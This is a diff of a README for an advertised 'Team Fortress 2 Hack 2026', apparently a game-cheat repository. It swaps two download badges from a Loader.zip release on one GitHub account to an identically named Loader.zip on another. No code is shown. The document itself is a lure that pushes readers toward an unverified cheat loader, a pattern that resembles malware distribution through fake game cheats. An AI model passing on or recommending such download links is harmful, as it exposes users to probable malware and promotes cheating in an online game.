@@ -33,7 +33,7 @@ Team Fortress 2 is Valve's class-based shooter — nine classes, random crits, a
 
 ## 🔗 Download
 
-[![Download Team Fortress 2 Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-8B0000?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Team Fortress 2 Hack 2026](https://img.shields.io/badge/DOWNLOAD-HERE-8B0000?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
@@ -325,7 +325,7 @@ Every setting can be saved, loaded, and shared.
 
 ## 📥 Download Team Fortress 2 Hack 2026
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-8B0000?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD-HERE-8B0000?style=for-the-badge&logo=download&logoColor=white)](https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip)
 
 ---
 
